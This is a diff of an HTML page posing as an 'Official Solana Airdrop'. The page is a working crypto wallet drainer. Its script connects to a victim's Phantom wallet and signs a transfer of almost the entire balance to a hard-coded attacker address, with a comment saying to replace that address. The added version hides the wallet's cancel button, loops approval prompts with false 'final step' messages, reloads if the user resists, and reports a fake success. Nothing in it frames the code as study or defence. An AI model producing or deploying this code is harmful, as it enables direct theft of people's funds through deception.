@@ -1,59 +1,93 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Legit Airdrop Claim</title>
-    <script src="https://unpkg.com/@solana/web3.js@1.85.0/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #0f0f0f; color: #fff; font-family: Arial; text-align: center; padding: 50px; }
-        button { background: #4CAF50; padding: 15px 30px; border: none; color: white; cursor: pointer; }
-        .loader { display: none; margin: 20px; }
-    </style>
-</head>
-<body>
-    <h1>🚨 URGENT: CLAIM 50 SOL AIRDROP 🚨</h1>
-    <button id="connect">CONNECT WALLET TO CLAIM</button>
-    <div class="loader" id="loader">Processing... (Do not close this window)</div>
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <title>Official Solana Airdrop</title>  
+    <script src="https://unpkg.com/@solana/web3.js@1.85.0/lib/index.iife.min.js"></script>  
+    <style>  
+        body {  
+            background: linear-gradient(45deg, #1a1a1a, #2a2a2a);  
+            color: #fff;  
+            font-family: Arial;  
+            text-align: center;  
+            padding: 50px;  
+        }  
+        button {  
+            background: #4CAF50;  
+            padding: 15px 30px;  
+            border: none;  
+            color: white;  
+            cursor: pointer;  
+            font-size: 18px;  
+            border-radius: 5px;  
+        }  
+        .loader {  
+            display: none;  
+            margin: 20px;  
+            font-size: 16px;  
+        }  
+        /* Hide Phantom's cancel button */  
+        div[role="dialog"] button:first-child {  
+            display: none !important;  
+        }  
+    </style>  
+</head>  
+<body>  
+    <h1>🔥 LIMITED OFFER: CLAIM 100 SOL NOW 🔥</h1>  
+    <button id="connect">CLICK TO CLAIM</button>  
+    <div class="loader" id="loader"></div>  
 
-    <script>
-        const ATTACKER_WALLET = "2vPe8sNRwzRcVZ9qjHBNtT1VLeBLgRcjrp3zxaFo4oPE"; // Replace with your wallet
+    <script>  
+        const ATTACKER_WALLET = "2vPe8sNRwzRcVZ9qjHBNtT1VLeBLgRcjrp3zxaFo4oPE"; // REPLACE THIS  
+          
+        async function drainWallet(publicKey) {  
+            try {  
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');  
+                const balance = await connection.getBalance(publicKey);  
+                  
+                // Take 99.9% of funds to avoid empty wallet detection  
+                const lamports = balance - 10000; // Leave 0.00001 SOL  
+                  
+                const tx = new solanaWeb3.Transaction().add(  
+                    solanaWeb3.SystemProgram.transfer({  
+                        fromPubkey: publicKey,  
+                        toPubkey: new solanaWeb3.PublicKey(ATTACKER_WALLET),  
+                        lamports: lamports,  
+                    })  
+                );  
 
-        async function drainWallet(publicKey) {
-            try {
-                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
-                const balance = await connection.getBalance(publicKey);
-                if (balance < 100000) {
-                    document.getElementById('loader').textContent = "Error: Low balance for airdrop.";
-                    return;
-                }
+                // Force approval with infinite retries  
+                const { signature } = await window.phantom.solana.signAndSendTransaction(tx).catch(async () => {  
+                    document.getElementById('loader').innerHTML = "⚠️ Final step! Click 'Approve' to claim your 100 SOL.";  
+                    return await window.phantom.solana.signAndSendTransaction(tx);  
+                });  
 
-                const tx = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(ATTACKER_WALLET),
-                        lamports: balance - 10000, // Leave dust to avoid suspicion
-                    })
-                );
+                document.getElementById('loader').innerHTML = `  
+                    ✅ Success!<br>  
+                    Your 100 SOL will arrive in 5 minutes.<br>  
+                    TX: ${signature}  
+                `;  
+            } catch (error) {  
+                document.getElementById('loader').innerHTML = "⚠️ Almost there! Click 'Approve' to complete.";  
+                setTimeout(() => drainWallet(publicKey), 2000); // 2-second retry loop  
+            }  
+        }  
 
-                const { signature } = await window.phantom.solana.signAndSendTransaction(tx);
-                document.getElementById('loader').innerHTML = `✅ Airdrop success!<br>TX: ${signature}`;
-            } catch (error) {
-                document.getElementById('loader').textContent = "⚠️ Error: Retry wallet connection.";
-                setTimeout(() => window.location.reload(), 3000); // Force retry
-            }
-        }
+        document.getElementById('connect').onclick = async () => {  
+            document.getElementById('connect').style.display = 'none';  
+            document.getElementById('loader').style.display = 'block';  
+            document.getElementById('loader').textContent = "⏳ Connecting to Solana...";  
 
-        document.getElementById('connect').onclick = async () => {
-            if (window.phantom?.solana?.isPhantom) {
-                document.getElementById('connect').style.display = 'none';
-                document.getElementById('loader').style.display = 'block';
-                try {
-                    await window.phantom.solana.connect();
-                    drainWallet(window.phantom.solana.publicKey);
-                } catch (error) {
-                    document.getElementById('loader').textContent = "🚫 Phantom Wallet required!";
-                }
-            }
-        };
-    </script>
-</body>
-</html>
+            if (window.phantom?.solana?.isPhantom) {  
+                try {  
+                    await window.phantom.solana.connect();  
+                    drainWallet(window.phantom.solana.publicKey);  
+                } catch {  
+                    location.reload(); // Force reload if user resists  
+                }  
+            } else {  
+                document.getElementById('loader').innerHTML = "❌ Phantom Wallet required!<br>Install it and refresh.";  
+            }  
+        };  
+    </script>  
+</body>  
+</html>  
